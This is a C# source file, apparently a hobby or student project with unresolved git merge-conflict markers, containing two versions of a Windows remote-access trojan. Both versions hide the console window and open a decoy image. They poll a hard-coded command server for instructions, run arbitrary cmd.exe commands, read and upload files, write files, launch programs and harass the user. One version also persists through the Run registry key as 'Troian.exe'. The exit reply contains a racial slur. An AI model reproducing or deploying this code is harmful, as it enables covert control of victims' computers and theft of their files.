<<<<<<< HEAD
﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.ComponentModel;

using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Input;
using System.Data.Common;

namespace ConsoleApp2
{
    class Program
    {

        //Mouse
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern Int32 SwapMouseButton(Int32 bSwap);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();


        //Simbolizeaza path-ul directorului curent
        string path = string.Empty;
        string path2 = string.Empty;
        static int time_wait = 5000;


        //Preia comanda de la server
        String GetCom(string local_name)
        {
            string html = "";
            string url = "http://piatrapecer.asuscomm.com:8080/";
            try
            {
                // Creates an HttpWebRequest for the specified URL. 
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Headers.Add("cookie", local_name);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                // Sends the HttpWebRequest and waits for a response.
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    html = response.Headers.Get("cookie");
                }
                response.Close();
                return html;

            }
            catch
            {
                Console.WriteLine("Serverul a crapat");
                return "";
            }

        }

        //Raspunde serverului
        void SetAns(string txt, string local_name)
        {

            string url = "http://piatrapecer.asuscomm.com:8080/";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

            byte[] data = Encoding.ASCII.GetBytes(txt);

            request.Method = "POST";
            request.Headers.Add("cookie", local_name);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;

            using (var stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }

            var response = (HttpWebResponse)request.GetResponse();
            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();


        }


        //Roteste ecranul cu "grade" 
        string RotateScreen(string grade, int nr_param)
        {
            string result = string.Empty;
            int nr_grade = Int32.Parse(grade);

            if (nr_param > 2)
                return "Error, prea multi parametri";

            if (nr_grade % 90 != 0 || nr_grade < 0 || nr_grade > 360)
                return "Error, nr_grade invalid";

            string comanda = @"display.exe /rotate:" + grade;
            result = ExecuteCom(comanda);

            return result;
        }

        //Inverseaza butoanele
        string InversMouse(string tip, int nr_param)
        {
            int nr_tip = Int32.Parse(tip);

            if (nr_param != 2)
                return "ERROR: wrong params number";

            if (nr_tip > 1 || nr_tip < 0)
                return "ERROR: wrong type";

            SwapMouseButton(nr_tip);

            return "OK: Mouse configurated";
        }

        //Afiseaza mesaje OS
        string OSMessage(string mesaj)
        {
            string result = string.Empty;
            string comanda = "mshta \"javascript:var sh=new ActiveXObject( \'WScript.Shell\' ); sh.Popup( \'" +mesaj+"\', 10, \'Title!\', 64 );close()\"";
            Console.WriteLine(comanda);
            result = ExecuteCom(comanda);
            return result;
        }

        //Porneste o aplicatie
        string OpenApplication(string myFavoritesPath, int nr_param)
        {

            if (nr_param > 2)
                return "Error: too many arguments";

            try
            {
                Process.Start(myFavoritesPath);
                return "OK: " + myFavoritesPath;
            }
            catch
            {
                return "Error: Cannot open " + myFavoritesPath;
            }
        }

        //Citeste un fisier
        string Read(string filename, int nr_param)
        {

            if (nr_param > 2)
                return "Error: too many arguments";

            string result = string.Empty;
            string full_path = "";
            if (filename.ElementAt(0) != '\\')
                full_path = path2 + path + filename;
            else
                full_path = filename;
            using (FileStream fs = new FileStream(full_path, FileMode.Open))
            using (BinaryReader br = new BinaryReader(fs))
            {
                byte[] bin = br.ReadBytes(Convert.ToInt32(fs.Length));
                result = Convert.ToBase64String(bin);
            }

            return result;
        }

        //Adauga daca in fisier existent sau creeaza un fisier nou
        string UpdateFile(string filename, string date)
        {
            string full_path = "";
            if (filename.ElementAt(0) != '\\')
                full_path = path2 + path + filename;
            else
                full_path = filename;
            using (StreamWriter sw = File.AppendText(full_path))
            {
                sw.WriteLine(date);
            }
            return "Datele au fost scrise";
        }

        //Afla localHost-ul
        string GetLocalName(string txt)
        {
            string result = txt.Remove(txt.Length - 2);
            if (result == null || result == "")
                result = "dima-zeu";
            return result;
        }

        bool IsPath(string txt)
        {
            if (txt.Length == 2)
                if (txt.ElementAt(1) == ':')
                    return true;
            return false;
        }

        //Executa o comanada in cmd
        string ExecuteCom(string comanda)
        {
            string result = string.Empty;
            bool outcmd = false;

            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = new Process { StartInfo = startInfo };

            process.Start();

            process.StandardInput.WriteLine(path2);
            process.StandardInput.WriteLine("cd " + path);
            process.StandardInput.WriteLine(comanda);
            process.StandardInput.WriteLine("exit");


            using (StreamReader streamReader = process.StandardOutput)
            {
                result = streamReader.ReadToEnd();
            }
            process.WaitForExit();

            StringReader strReader = new StringReader(result);
            result = string.Empty;
            string path_aux = path;
            while (true)
            {
                path_aux = strReader.ReadLine();
                if (path_aux.Contains(">exit") == true)
                {
                    path_aux = path_aux.Remove(path_aux.Length - 5);
                    break;
                }
                if (outcmd == true)
                    result += path_aux + "\n";
                if (path_aux.Length > comanda.Length)
                {
                    path_aux = path_aux.Substring(path_aux.Length - comanda.Length);
                }
                if (path_aux.Equals(comanda) == true)
                {
                    outcmd = true;
                }

            }
            return result;
        }


        string ExecuteCD(string comanda)
        {
            string result = string.Empty;
            string aux = "";

            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = new Process { StartInfo = startInfo };

            process.Start();

            process.StandardInput.WriteLine(path2);
            process.StandardInput.WriteLine("cd " + path);

            process.StandardInput.WriteLine(comanda);
            process.StandardInput.WriteLine("exit");


            using (StreamReader streamReader = process.StandardOutput)
            {
                result = streamReader.ReadToEnd();
            }
            //Console.WriteLine("!!!" + result + "!!!");
            process.WaitForExit();

            StringReader strReader = new StringReader(result);
            result = string.Empty;
            while (true)
            {
                aux = strReader.ReadLine();
                if (aux.Contains(">exit") == true)
                {
                    path2 = aux.ElementAt(0) + ":";
                    result = aux.Remove(0, 2);
                    result = result.Remove(result.Length - 5);
                    if (result.ElementAt(result.Length - 1) != '\\')
                        result += "\\";
                    break;
                }
            }
            return result;
        }

        string ExCmd(string comanda, string[] words, int nr_params)
        {
            string result = "";
            if (nr_params > 1)
            {
                if (nr_params == 2 && IsPath(words[1]))
                {
                    path = "/";
                    path2 = words[1];
                    result = path2 + path;
                }
                else if (words[1] == "cd")
                {
                    path = ExecuteCD(comanda.Remove(0, words[0].Length + 1));
                    result = path2 + path;
                }
                else
                {
                    result = ExecuteCom(comanda.Remove(0, words[0].Length + 1));
                }
            }
            Console.WriteLine("Result la CMD este: " + result + "!");
            return result;
        }

        void Nest()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("Troian.exe","\"" + path2 + path+ "Troian.exe\"");
        }

        //Functia main
        static void Main(string[] args)
        {
            
            //Hide console
            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, 0);


            String comanda = "";
            String raspuns = "";
            Program myProcess = new Program();
            string local_name = myProcess.GetLocalName(myProcess.ExecuteCom("hostname"));
            myProcess.path = myProcess.ExecuteCD("cd");

            Console.WriteLine("Host-ul este: " + local_name + "!");
            Console.WriteLine("Path-ul initial este: " + myProcess.path2 + "!" + myProcess.path + "!");

            myProcess.ExecuteCom("cars.jpg");
            myProcess.Nest();

            do
            {
                comanda = myProcess.GetCom(local_name);

                Console.WriteLine("Testez comanda: !" + comanda + "!");

                if (comanda != "" && comanda != null)
                {


                    comanda = System.Text.RegularExpressions.Regex.Replace(comanda, @"\s+", " ");
                    string[] words = comanda.Split(' ');

                    switch (words[0])
                    {
                        case "run":
                            raspuns = myProcess.OpenApplication(words[1], words.Length);
                            break;

                        case "read":
                            raspuns = myProcess.Read(words[1], words.Length);
                            break;

                        case "update":
                            raspuns = myProcess.UpdateFile(words[1], comanda.Remove(0, 8 + words[1].Length));
                            break;

                        case "cmd":
                            raspuns = myProcess.ExCmd(comanda, words, words.Length);
                            break;

                        case "rotate":
                            raspuns = myProcess.RotateScreen(words[1], words.Length);
                            break;

                        case "invert":
                            raspuns = myProcess.InversMouse(words[1], words.Length);
                            break;

                        case "message":
                            raspuns = myProcess.OSMessage(comanda.Remove(0, 8));
                            break;

                        case "exit":
                            raspuns = "See you nigga";
                            break;

                        default:
                            Console.WriteLine("Default case");
                            raspuns = "Error: Invalid Command";
                            break;
                    }
                    time_wait = 1000;
                    myProcess.SetAns(raspuns, local_name);

                }
                else
                {
                    time_wait = 5000;
                }
                System.Threading.Thread.Sleep(time_wait);

            } while (comanda != "exit");


        }
    }
=======
﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.ComponentModel;

using System.Net;
using System.IO;
using System.Runtime.InteropServices;

namespace ConsoleApp2
{
    class Program
    {

        //Mouse
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern Int32 SwapMouseButton(Int32 bSwap);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        

        //Simbolizeaza path-ul directorului curent
        string path = string.Empty;
        static int time_wait = 5000;
        

        //Preia comanda de la server
        String GetCom(string local_name)
        {
            string html = "";
            string url = "http://piatrapecer.asuscomm.com:8080/";

            try
            {
                // Creates an HttpWebRequest for the specified URL. 
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Headers.Add("cookie", local_name);
                request.AutomaticDecompression = DecompressionMethods.GZip;

                // Sends the HttpWebRequest and waits for a response.
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    html = response.Headers.Get("cookie");
                }
                response.Close();
                return html;

            }
            catch 
            {
                Console.WriteLine("Serverul a crapat");
                return "";
            }

        }

        //Raspunde serverului
        void SetAns(string txt, string local_name)
        {

            string url = "http://piatrapecer.asuscomm.com:8080/";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            
            byte[] data = Encoding.ASCII.GetBytes(txt);
            
            request.Method = "POST";
            request.Headers.Add("cookie", local_name);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;

            using (var stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }

            var response = (HttpWebResponse)request.GetResponse();
            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();


        }

        //Executa o comanada in cmd
        string ExecuteCom(string comanda)
        {
            string result = string.Empty;
            bool outcmd = false;

            var startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var process = new Process { StartInfo = startInfo };

            process.Start();

            if (path != null)
                process.StandardInput.WriteLine("cd " + path);
            process.StandardInput.WriteLine(comanda);
            process.StandardInput.WriteLine("exit");


            using (StreamReader streamReader = process.StandardOutput)
            {
                result = streamReader.ReadToEnd();
            }
            process.WaitForExit();

            StringReader strReader = new StringReader(result);
            result = string.Empty;
            while (true)
            {
                path = strReader.ReadLine();
                if (path.Contains(">exit") == true)
                {
                    path = path.Remove(path.Length - 5);
                    break;
                }
                if (outcmd == true)
                    result += path + "\n";
                if (path.Length > comanda.Length)
                {
                    path = path.Substring(path.Length - comanda.Length);
                }
                if (path.Equals(comanda) == true)
                {
                    outcmd = true;
                }

            }
            return result;
        }

        //Roteste ecranul cu "grade" 
        string RotateScreen(string grade, int nr_param)
        {
            string result = string.Empty;
            int nr_grade = Int32.Parse(grade);

            if (nr_param > 2)
                return "Error, prea multi parametri";

            if (nr_grade % 90 != 0 || nr_grade < 0 || nr_grade > 360)
                return "Error, nr_grade invalid";

            string comanda = @"display.exe /rotate:" + grade;
            result = ExecuteCom(comanda);

            return result;
        }

        //Inverseaza butoanele
        string InversMouse(string tip, int nr_param)
        {
            int nr_tip = Int32.Parse(tip);

            if (nr_param != 2)
                return "ERROR: wrong params number";

            if (nr_tip > 1 || nr_tip < 0)
                return "ERROR: wrong type";

            SwapMouseButton(nr_tip);

            return "OK: Mouse configurated";
        }
        
        //Afiseaza mesaje OS
        string OSMessage(string mesaj)
        {
            string result = string.Empty;
            string comanda = "msg \"%username%\" " + "\"" + mesaj + "\"";
            Console.WriteLine(comanda);
            result = ExecuteCom(comanda);
            return result;
        }

        //Porneste o aplicatie
        string OpenApplication(string myFavoritesPath, int nr_param)
        {

            if (nr_param > 2)
                return "Error: too many arguments";

            try
            {
                Process.Start(myFavoritesPath);
                return "OK: " + myFavoritesPath;
            }
            catch
            {
                return "Error: Cannot open " + myFavoritesPath;
            }
        }

        //Citeste un fisier
        string Read(string filename, int nr_param)
        {

            if(nr_param > 2)
                return "Error: too many arguments";

            string result = string.Empty;
            string aux = string.Empty;

            using (StreamReader sr = File.OpenText(filename))
            {
                while ((aux = sr.ReadLine()) != null)
                {
                    result += aux + "\n";
                }
            }
            return result;
        }

        //Adauga daca in fisier existent sau creeaza un fisier nou
        string UpdateFile(string filename, string date)
        {
            using (StreamWriter sw = File.AppendText(filename))
            {
                sw.WriteLine(date);
            }
            return "Datele au fost scrise";
        }

        //Functia main
        static void Main(string[] args)
        {
            //Hide console
            //IntPtr myWindow = GetConsoleWindow();
            //ShowWindow(myWindow, 0);


            String comanda = "";
            String raspuns = "";
            Program myProcess = new Program();
            string local_name = myProcess.ExecuteCom("hostname");
            local_name = local_name.Remove(local_name.Length - 2);
            Console.WriteLine("!" + local_name + "!");
            if (local_name == null || local_name == "")
                local_name = "dima-zeu";

            myProcess.ExecuteCom("cars.jpg");
            
            do
            {
                comanda = myProcess.GetCom(local_name);

                Console.WriteLine("Testez comanda: !" + comanda + "!");

                if (comanda != "" && comanda != null)
                {


                    comanda = System.Text.RegularExpressions.Regex.Replace(comanda, @"\s+", " ");
                    string[] words = comanda.Split(' ');

                    switch (words[0])
                    {
                        case "run":
                            raspuns = myProcess.OpenApplication(words[1], words.Length);
                            break;

                        case "read":
                            raspuns = myProcess.Read(words[1], words.Length);
                            break;

                        case "update":
                            raspuns = myProcess.UpdateFile(words[1], comanda.Remove(0, 8 + words[1].Length));
                            break;
                     
                        case "cmd":
                            raspuns = myProcess.ExecuteCom(comanda.Remove(0, 4));
                            break;

                        case "rotate":
                            raspuns = myProcess.RotateScreen(words[1], words.Length);
                            break;

                        case "invert":
                            raspuns = myProcess.InversMouse(words[1], words.Length);
                            break;

                        case "message":
                            raspuns = myProcess.OSMessage(comanda.Remove(0, 8));
                            break;

                        case "exit":
                            raspuns = "See you nigga";
                            break;

                        default:
                            Console.WriteLine("Default case");
                            raspuns = "Error: Invalid Command";
                            break;
                    }
                    time_wait = 1000;
                    myProcess.SetAns(raspuns, local_name);
                    
                } else
                {
                    time_wait = 5000;
                }
                System.Threading.Thread.Sleep(time_wait);

            } while (comanda != "exit");

           
        }
    }
>>>>>>> cb09512e448cc5956f427c4e23b2afbc6cc42c9a
}